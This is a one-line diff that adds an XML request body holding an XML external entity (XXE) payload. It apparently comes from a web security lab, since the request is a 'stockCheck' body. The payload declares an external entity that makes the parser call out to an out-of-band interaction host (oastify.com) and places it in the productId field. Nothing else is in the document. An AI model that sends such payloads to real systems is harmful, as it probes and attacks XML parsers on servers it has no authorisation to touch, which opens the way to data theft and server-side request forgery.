@@ -1,0 +1,1 @@
+<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "http://anything.oastify.com">]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
